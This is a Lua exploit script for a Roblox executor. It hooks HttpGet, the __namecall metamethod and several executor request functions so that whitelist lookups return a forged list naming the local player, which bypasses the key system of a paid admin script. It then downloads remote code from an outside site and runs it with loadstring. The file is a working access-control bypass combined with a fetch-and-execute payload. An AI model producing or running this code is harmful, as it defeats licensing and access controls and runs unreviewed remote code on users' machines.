local hookfunction   = hookfunction or replaceclosure or detour_function
local hookmetamethod = hookmetamethod
local newcclosure    = newcclosure or function(f) return f end
local getgenv        = getgenv or function() return _G end

if not hookfunction then return end

local myName = game:GetService("Players").LocalPlayer.Name
local fakeWhitelist = '{"users":["' .. myName .. '","SAYROX","LOVESYOU"]}'

local function isWL(url)
    return type(url) == "string" and url:lower():find("whitelist", 1, true) ~= nil
end

pcall(function()
    local orig
    orig = hookfunction(game.HttpGet, newcclosure(function(self, url, ...)
        if isWL(url) then return fakeWhitelist end
        return orig(self, url, ...)
    end))
end)

pcall(function()
    local orig
    orig = hookfunction(game.HttpGetAsync, newcclosure(function(self, url, ...)
        if isWL(url) then return fakeWhitelist end
        return orig(self, url, ...)
    end))
end)

pcall(function()
    if not hookmetamethod then return end
    local origNamecall
    origNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
        local method = getnamecallmethod and getnamecallmethod() or ""
        if method == "HttpGet" or method == "HttpGetAsync" or method == "GetAsync" then
            local args = {...}
            if isWL(args[1]) then return fakeWhitelist end
        end
        return origNamecall(self, ...)
    end))
end)

local function wrap(orig)
    return newcclosure(function(opts)
        if isWL(opts.Url or opts.url or "") then
            return { Body = fakeWhitelist, StatusCode = 200, Success = true,
                     Headers = {["Content-Type"] = "application/json"} }
        end
        return orig(opts)
    end)
end

pcall(function() if syn and syn.request then syn.request = wrap(syn.request) end end)
pcall(function() if http and http.request then http.request = wrap(http.request) end end)
pcall(function() if http_request then getgenv().http_request = wrap(http_request) end end)
pcall(function() if request then getgenv().request = wrap(request) end end)

print("Spoofing user: " .. myName)
print("Loading AK Admin.")
print("Sayrox rules again<3")
print("fuckass key system got bummed")

loadstring(game:HttpGet("https://absent.wtf/AKADMIN.lua"))()
